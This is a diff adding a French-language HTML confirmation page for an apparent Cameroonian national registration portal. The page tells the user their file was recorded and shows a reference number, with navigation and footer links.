@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Dossier enregistré — Portail national</title>
+    <link rel="stylesheet" href="/style.css" />
+  </head>
+  <body>
+    <div class="flag-strip" aria-hidden="true"></div>
+    <div class="gov-top">
+      <span class="gov-top__motto">République du Cameroun · Paix – Travail – Patrie</span>
+      <span class="gov-top__secure">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+          <path
+            d="M12 1L4 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-4z"
+            fill="currentColor"
+            opacity="0.9"
+          />
+        </svg>
+        Accusé de réception sécurisé
+      </span>
+    </div>
+    <nav class="site-nav" aria-label="Navigation principale">
+      <div class="site-nav__inner">
+        <div class="site-nav__links">
+          <a href="/index.html">Accueil</a>
+          <a href="/form.html">Enregistrement</a>
+          <a href="/admin.html">Espace habilité</a>
+        </div>
+      </div>
+    </nav>
+
+    <main style="padding-top: 2.5rem; padding-bottom: 3rem">
+      <div class="card" style="text-align: center; max-width: 520px">
+        <div style="font-size: 3rem; margin-bottom: 1rem; color: var(--cm-green)" aria-hidden="true">
+          ✓
+        </div>
+        <h1 class="page-title">Transmission réussie</h1>
+        <p style="color: var(--muted); margin: 1rem 0 1.5rem">
+          Votre dossier a été enregistré sur le serveur national de traitement. Conservez la
+          référence ci-dessous. Un accusé peut vous être adressé par votre opérateur sous huit jours
+          ouvrés.
+        </p>
+        <p style="font-size: 0.95rem; color: var(--inst-blue); margin-bottom: 1.5rem">
+          Référence dossier&nbsp;: <span id="ref-id" class="mono">—</span>
+        </p>
+        <div class="cta-row">
+          <a class="btn btn-primary" href="/index.html">Retour à l’accueil</a>
+          <a class="btn btn-secondary" href="/form.html">Nouveau dossier</a>
+        </div>
+      </div>
+    </main>
+
+    <footer class="site-footer">
+      <div class="footer-links">
+        <a href="/index.html">Accueil</a>
+        <a href="/form.html">Enregistrement</a>
+      </div>
+      <p style="margin: 0">© République du Cameroun</p>
+    </footer>
+    <script src="/script.js"></script>
+  </body>
+</html>
